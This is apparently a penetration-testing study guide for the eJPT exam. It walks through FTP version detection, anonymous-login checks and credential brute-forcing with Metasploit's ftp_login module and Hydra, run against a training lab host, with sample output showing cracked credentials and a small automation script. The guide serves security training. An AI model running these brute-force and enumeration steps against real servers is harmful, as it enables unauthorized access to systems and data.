# 🔧 Metasploit FTP Enumeration - Complete Service Investigation

Metasploit Framework provides powerful auxiliary modules for comprehensive FTP server enumeration, including version detection, brute force attacks, and anonymous login testing. Essential for identifying FTP vulnerabilities and misconfigurations during penetration testing.

**Location:** `05-service-enumeration/network-services/ftp-enumeration/metasploit-ftp-enum.md`

## 🎯 What is Metasploit FTP Enumeration?

Metasploit Framework offers specialized auxiliary modules for FTP enumeration that automate the process of gathering intelligence about FTP services. These modules can identify service versions, test for anonymous access, perform credential brute force attacks, and detect common misconfigurations. Key capabilities include:
- **Version Detection:** Identify FTP server software and version numbers
- **Anonymous Login Testing:** Check for anonymous FTP access availability
- **Credential Brute Force:** Automated username/password attacks using wordlists
- **Configuration Analysis:** Detect common FTP misconfigurations and weaknesses

## 📦 Installation and Setup

### Prerequisites:
- Metasploit Framework installed (included in Kali Linux)
- Network connectivity to target FTP services
- Wordlists for brute force attacks (located in `/usr/share/metasploit-framework/data/wordlists/`)

### Installation:
```bash
# Update Metasploit database
msfdb init

# Start Metasploit console
msfconsole

# Verify FTP modules are available
search type:auxiliary name:ftp
```

### Initial Configuration:
```bash
# Set global variables (optional)
setg RHOSTS target_ip_range
setg THREADS 10

# Verify database connectivity
db_status
```

## 🔧 Basic Usage and Syntax

### Basic Workflow:
1. **Launch msfconsole:** Start the Metasploit Framework console
2. **Select Module:** Choose appropriate FTP auxiliary module
3. **Configure Options:** Set target IP, wordlists, and parameters
4. **Execute Module:** Run the enumeration and analyze results

### Command Structure:
```bash
# Basic module workflow
msfconsole                                    # Start Metasploit
use auxiliary/scanner/ftp/module_name         # Load FTP module
set RHOSTS target_ip                          # Set target
show options                                  # Review configuration
run                                           # Execute module
```

## ⚙️ Command Line Options

### Core msfconsole Commands:
| Command | Purpose | Example |
|---------|---------|---------|
| `use` | Load auxiliary module | `use auxiliary/scanner/ftp/ftp_version` |
| `set` | Configure module options | `set RHOSTS 192.168.1.100` |
| `setg` | Set global variables | `setg THREADS 10` |
| `show options` | Display module settings | `show options` |
| `run` | Execute the module | `run` |

### Module Configuration Options:
| Option | Purpose | Example |
|--------|---------|---------|
| `RHOSTS` | Target IP addresses | `set RHOSTS 192.168.1.0/24` |
| `RPORT` | Target FTP port | `set RPORT 21` |
| `THREADS` | Concurrent threads | `set THREADS 5` |
| `USER_FILE` | Username wordlist | `set USER_FILE /path/to/users.txt` |
| `PASS_FILE` | Password wordlist | `set PASS_FILE /path/to/passwords.txt` |

### FTP-Specific Options:
| Option | Purpose | Example |
|--------|---------|---------|
| `FTPUSER` | Specific username | `set FTPUSER admin` |
| `FTPPASS` | Specific password | `set FTPPASS password123` |
| `BRUTEFORCE_SPEED` | Attack speed | `set BRUTEFORCE_SPEED 3` |
| `STOP_ON_SUCCESS` | Stop after success | `set STOP_ON_SUCCESS true` |

## 🧪 Real Lab Examples

### Example 1: FTP Version Detection
```bash
# Start Metasploit console
msfconsole

# Load FTP version scanner
use auxiliary/scanner/ftp/ftp_version

# Configure target
set RHOSTS demo.ine.local

# Execute scan
run

# Expected output
[+] 192.228.115.3:21    - FTP Banner: '220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.228.115.3]\x0d\x0a'
[*] demo.ine.local:21   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Example 2: FTP Anonymous Login Testing
```bash
# Load anonymous FTP scanner
use auxiliary/scanner/ftp/anonymous

# Set target
set RHOSTS demo.ine.local

# Run anonymous test
run

# Expected output (when anonymous disabled)
[*] demo.ine.local:21   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Example 3: FTP Brute Force Attack
```bash
# Load FTP login scanner
use auxiliary/scanner/ftp/ftp_login

# Configure target
set RHOSTS demo.ine.local

# Set wordlists
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

# Execute brute force
run

# Expected output with successful login
[+] 192.228.115.3:21 - LOGIN Successful: sysadmin:654321
[-] 192.228.115.3:21 - LOGIN FAILED: sysadmin:admin (Incorrect: )
[-] 192.228.115.3:21 - LOGIN FAILED: sysadmin:123456 (Incorrect: )
[*] Scanned 1 of 1 hosts (100% complete)
```

### Example 4: Complete FTP Enumeration Workflow
```bash
# Phase 1: Version detection
use auxiliary/scanner/ftp/ftp_version
set RHOSTS demo.ine.local
run

# Phase 2: Anonymous access test
use auxiliary/scanner/ftp/anonymous
set RHOSTS demo.ine.local
run

# Phase 3: Brute force if anonymous fails
use auxiliary/scanner/ftp/ftp_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run

# Phase 4: Connect with found credentials
# Outside of Metasploit
ftp demo.ine.local
# Username: sysadmin
# Password: 654321
```

## 🎯 eJPT Exam Focus

### Essential Skills for eJPT:
- **FTP Version Identification** - 85% importance in service enumeration phase
- **Anonymous FTP Testing** - 75% importance for finding quick wins
- **Credential Brute Force** - 90% importance when other methods fail
- **FTP Client Usage** - 70% importance for post-exploitation file access

### Critical Commands to Master:
```bash
# Version detection - always first step
use auxiliary/scanner/ftp/ftp_version

# Anonymous testing - quick win check
use auxiliary/scanner/ftp/anonymous

# Brute force - main attack vector
use auxiliary/scanner/ftp/ftp_login

# Direct FTP connection - post-compromise
ftp target_ip
```

### eJPT Exam Scenarios:
1. **Service Enumeration Phase:** Students must identify FTP services and versions
   - Required skills: Module selection, target configuration, result interpretation
   - Expected commands: `ftp_version` module with proper RHOSTS setting
   - Success criteria: Extract FTP server software and version information

2. **Vulnerability Assessment Phase:** Test for anonymous access and weak credentials
   - Required skills: Anonymous testing, wordlist configuration, brute force execution
   - Expected commands: `anonymous` and `ftp_login` modules with wordlists
   - Success criteria: Identify authentication bypasses or valid credentials

### Exam Tips and Tricks:
- **Always start with version detection** - provides context for further attacks
- **Test anonymous access first** - fastest way to gain FTP access if enabled
- **Use built-in wordlists** - Metasploit includes optimized wordlists in standard locations
- **Monitor for successful logins** - look for [+] indicators in brute force output
- **Document all findings** - version numbers and credentials are critical for reporting

### Common eJPT Questions:
- What FTP server software and version is running on the target?
- Is anonymous FTP access enabled on the discovered service?
- What credentials can be used to authenticate to the FTP server?

## ⚠️ Common Issues & Troubleshooting

### Issue 1: Module Not Found Errors
**Problem:** "Failed to load module" or module not found when using `use` command
**Cause:** Metasploit database not initialized or corrupted module cache
**Solution:**
```bash
# Reinitialize Metasploit database
msfdb reinit

# Update module cache
msfconsole -x "reload_all"

# Search for available modules
search type:auxiliary ftp
```

### Issue 2: Connection Timeouts During Brute Force
**Problem:** Modules hang or timeout during brute force attempts
**Cause:** Too many concurrent threads or network issues
**Solution:**
```bash
# Reduce thread count
set THREADS 1

# Increase timeout values
set ConnectTimeout 30

# Test connectivity first
ping -c 4 target_ip
```

### Issue 3: Wordlist Path Errors
**Problem:** "File not found" errors when setting USER_FILE or PASS_FILE
**Cause:** Incorrect wordlist paths or missing files
**Solution:**
```bash
# Verify wordlist locations
ls -la /usr/share/metasploit-framework/data/wordlists/

# Use absolute paths
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

### Issue 4: No Results from Anonymous Scanner
**Problem:** Anonymous module completes but shows no results
**Cause:** Anonymous FTP is disabled, which is expected behavior
**Solution:**
```bash
# This is normal - proceed to brute force
use auxiliary/scanner/ftp/ftp_login

# Configure for targeted attack
set USERNAME admin
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.txt
```

## 🔗 Integration with Other Tools

### Primary Integration: Nmap → Metasploit → FTP Client
```bash
# Step 1: Nmap discovers FTP services
nmap -sV -p21 target_network

# Step 2: Metasploit enumerates FTP details
msfconsole
use auxiliary/scanner/ftp/ftp_version
set RHOSTS discovered_ftp_hosts
run

# Step 3: FTP client for file access
ftp target_ip
# Use credentials found by Metasploit
```

### Secondary Integration: Metasploit → Hydra (Alternative)
```bash
# If Metasploit brute force is slow
use auxiliary/scanner/ftp/ftp_login  # Initial attempt
# If needed, switch to Hydra for faster brute force
hydra -L users.txt -P passwords.txt ftp://target_ip
```

### Advanced Workflows:
```bash
# Complete FTP assessment workflow
# 1. Service discovery
nmap -sV -p21 target_range

# 2. Detailed enumeration
msfconsole
use auxiliary/scanner/ftp/ftp_version
# ... configure and run

# 3. Access testing
use auxiliary/scanner/ftp/anonymous
# ... configure and run

# 4. Credential attacks
use auxiliary/scanner/ftp/ftp_login
# ... configure and run

# 5. Manual verification
ftp target_ip
```

## 📝 Documentation and Reporting

### Evidence Collection Requirements:
1. **Screenshots:** Metasploit console output showing successful enumeration
2. **Command Outputs:** Complete module execution results and findings
3. **Credential Information:** Any discovered usernames and passwords
4. **Service Details:** FTP server software, version, and configuration notes

### Report Template Structure:
```markdown
## FTP Service Enumeration Results

### Target Information
- Target: demo.ine.local (192.228.115.3)
- Date/Time: [timestamp]
- Tool Version: Metasploit Framework v6.x

### Commands Executed
```bash
# Version detection
use auxiliary/scanner/ftp/ftp_version
set RHOSTS demo.ine.local
run

# Anonymous access test
use auxiliary/scanner/ftp/anonymous
set RHOSTS demo.ine.local
run

# Credential brute force
use auxiliary/scanner/ftp/ftp_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

### Key Findings
- **FTP Server:** ProFTPD 1.3.5a Server (AttackDefense-FTP)
- **Anonymous Access:** Disabled
- **Valid Credentials:** sysadmin:654321
- **File System Access:** Confirmed via FTP client connection

### Recommendations
- Update FTP server software to latest version
- Implement stronger password policies
- Consider disabling FTP in favor of SFTP/FTPS
```

### Automation Scripts:
```bash
#!/bin/bash
# FTP enumeration automation script
echo "Starting FTP enumeration for $1"
msfconsole -x "
use auxiliary/scanner/ftp/ftp_version;
set RHOSTS $1;
run;
use auxiliary/scanner/ftp/anonymous;
set RHOSTS $1;
run;
use auxiliary/scanner/ftp/ftp_login;
set RHOSTS $1;
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt;
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt;
run;
exit"
```

## 📚 Additional Resources

### Official Documentation:
- Metasploit Framework: https://docs.rapid7.com/metasploit/
- Metasploit Auxiliary Modules: https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary
- FTP RFC Documentation: https://tools.ietf.org/html/rfc959

### Learning Resources:
- Metasploit Unleashed Course: https://www.offensive-security.com/metasploit-unleashed/
- eJPT Study Guide: Focus on auxiliary modules and service enumeration
- INE Labs: Hands-on FTP enumeration practice labs

### Community Resources:
- Metasploit Community: https://github.com/rapid7/metasploit-framework/discussions
- eJPT Reddit: r/eJPT for exam-specific guidance
- Penetration Testing Forums: Discussion of FTP enumeration techniques

### Related Tools:
- **Hydra:** Alternative brute force tool with faster performance
- **Ncrack:** Network authentication cracking tool supporting FTP
- **FTP Clients:** Command-line and GUI tools for accessing discovered credentials
